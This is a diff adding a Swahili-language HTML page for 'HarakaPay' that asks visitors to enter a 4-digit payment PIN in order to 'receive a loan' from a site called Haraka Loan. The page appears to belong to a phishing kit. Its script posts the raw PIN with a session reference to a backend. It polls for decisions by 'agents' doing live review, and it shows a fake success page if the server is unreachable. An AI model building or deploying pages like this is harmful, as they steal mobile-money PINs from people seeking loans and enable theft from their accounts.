@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>HarakaPay • PIN</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8f9fa;
+      min-height: 100vh;
+      color: #1a1a2e;
+      display: block;
+      margin: 8px;
+    }
+
+    @media (min-width: 768px) {
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      margin: 0 auto;
+      background: transparent;
+    }
+
+    .logo {
+      padding: 30px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo img {
+      height: 45px;
+      width: auto;
+      display: block;
+    }
+
+    .pin-container {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 32px 24px 28px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.05);
+      border: 1px solid #edf2f7;
+      text-align: center;
+    }
+
+    .pin-icon {
+      width: 56px;
+      height: 56px;
+      background: #1b5e20;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+    }
+
+    .pin-icon svg {
+      width: 40px;
+      height: 40px;
+      fill: white;
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #2d3436;
+    }
+
+    .pin-container p {
+      color: #636e72;
+      margin-bottom: 30px;
+      font-size: 0.95rem;
+      line-height: 1.4;
+    }
+
+    .pin-input {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .pin-input input {
+      width: 55px;
+      height: 65px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      border: 2px solid #e1e5e9;
+      border-radius: 12px;
+      color: #1b5e20;
+      background: #ffffff;
+      caret-color: #1b5e20;
+      font-family: inherit;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      -moz-appearance: textfield;
+      padding: 0;
+      line-height: normal;
+    }
+
+    .pin-input input.filled {
+      border-color: #1b5e20;
+    }
+
+    .pin-input input:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(27, 94, 32, 0.15);
+    }
+
+    .pin-input input:focus:not(.filled) {
+      border-color: #e1e5e9;
+    }
+
+    .pin-input input::-webkit-outer-spin-button,
+    .pin-input input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #1b5e20;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn:hover { background: #145218; }
+    .btn:active { background: #0e3e12; }
+
+    .switch-account {
+      margin-top: 24px;
+      font-size: 0.95rem;
+      color: #636e72;
+    }
+
+    .switch-account a {
+      color: #1b5e20;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .error {
+      display: none;
+      margin-top: 14px;
+      color: #c0392b;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+
+    .error.show { display: block; }
+
+    @media (max-width: 420px) {
+      .container {
+        max-width: 100%;
+        padding: 0 4px;
+      }
+      .pin-input input {
+        width: 48px;
+        height: 58px;
+        font-size: 22px;
+      }
+      .pin-input { gap: 8px; }
+      .btn { font-size: 1rem; padding: 14px 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="logo.png" alt="HarakaPay">
+    </div>
+
+    <div class="pin-container">
+      <div class="pin-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 1C8.14 1 5 4.14 5 8v2H4c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V8c0-3.86-3.14-7-7-7zm0 2c2.76 0 5 2.24 5 5v2H7V8c0-2.76 2.24-5 5-5zm0 10c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"></path></svg>
+      </div>
+      <h2>Ingiza PIN</h2>
+      <p>Thibitisha kwa PIN yako ya HarakaPay ili kupokea mkopo wako</p>
+
+      <form id="pinForm" novalidate>
+        <div class="pin-input" id="pinInputs">
+          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
+          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+        </div>
+        <p class="error" id="pinError">Tafadhali ingiza PIN yote ya tarakimu 4.</p>
+        <button type="submit" class="btn">Thibitisha</button>
+      </form>
+
+      <div class="switch-account">
+        <a href="login.html">Badilisha akaunti</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const inputs = Array.from(document.querySelectorAll('#pinInputs input'));
+    const form = document.getElementById('pinForm');
+    const pinError = document.getElementById('pinError');
+
+    function syncFilled(input) {
+      input.classList.toggle('filled', input.value.length > 0);
+    }
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 1);
+        syncFilled(e.target);
+        pinError.classList.remove('show');
+
+        if (e.target.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('blur', () => syncFilled(input));
+      input.addEventListener('paste', (e) => {
+        const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
+        const digits = paste.replace(/[^0-9]/g, '').slice(0, inputs.length);
+        if (digits.length) {
+          e.preventDefault();
+          digits.split('').forEach((d, i) => {
+            inputs[i].value = d;
+            syncFilled(inputs[i]);
+          });
+          inputs[Math.min(digits.length, inputs.length - 1)].focus();
+        }
+        setTimeout(() => syncFilled(input), 0);
+      });
+
+      syncFilled(input);
+    });
+
+    const ref = new URLSearchParams(location.search).get('ref');
+
+    /* if agents already declined this session, tell the user straight away */
+    (async function checkStatus() {
+      if (!ref) return;
+      try {
+        const res = await fetch('/api/pstatus?ref=' + encodeURIComponent(ref), { cache: 'no-store' });
+        if (!res.ok) return;                 /* unknown ref — continue anyway */
+        const j = await res.json();
+        if (j.ok && j.status === 'declined') {
+          document.querySelector('.pin-container').innerHTML =
+            '<div class="pin-icon" style="background:#c0392b;">✕</div>' +
+            '<h2>Imekatazwa</h2>' +
+            '<p>Uunganisho wa HarakaPay (Ref ' + ref + ') ulikatazwa na timu yetu. Rudi kwenye tovuti na ujaribu tena.</p>' +
+            '<a class="btn" style="display:inline-block;text-decoration:none;" href="index.html">Rudi kwenye Haraka Loan</a>';
+          document.getElementById('pinForm').style.display = 'none';
+        }
+      } catch (_) { /* server not running — continue offline */ }
+    })();
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const pin = inputs.map((i) => i.value).join('');
+      if (pin.length !== 4) {
+        pinError.classList.add('show');
+        return;
+      }
+
+      const btn = form.querySelector('.btn');
+      btn.disabled = true;
+      btn.textContent = 'Inathibitisha…';
+
+      let ref2 = null;
+      try {
+        const res = await fetch('/api/paysubmit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ref: ref, pin: pin })
+        });
+        const j = await res.json();
+        if (j.ok && (j.ref || ref)) { ref2 = j.ref || ref; }
+        if (j.ok && j.status === 'declined') {
+          window.location.href = 'status.html?ref=' + encodeURIComponent(j.ref || ref);
+          return;
+        }
+      } catch (_) { /* backend not running — fallback below */ }
+
+      btn.disabled = false;
+      btn.textContent = 'Thibitisha';
+
+      if (ref2) {
+        /* live review: hand over to the payment status preloader */
+        window.location.href = 'status.html?ref=' + encodeURIComponent(ref2);
+      } else {
+        /* offline fallback: go straight to the receipt page */
+        localStorage.setItem('haraka_pay_connected', 'true');
+        window.location.href = 'success.html';
+      }
+    });
+  </script>
+</body>
+</html>
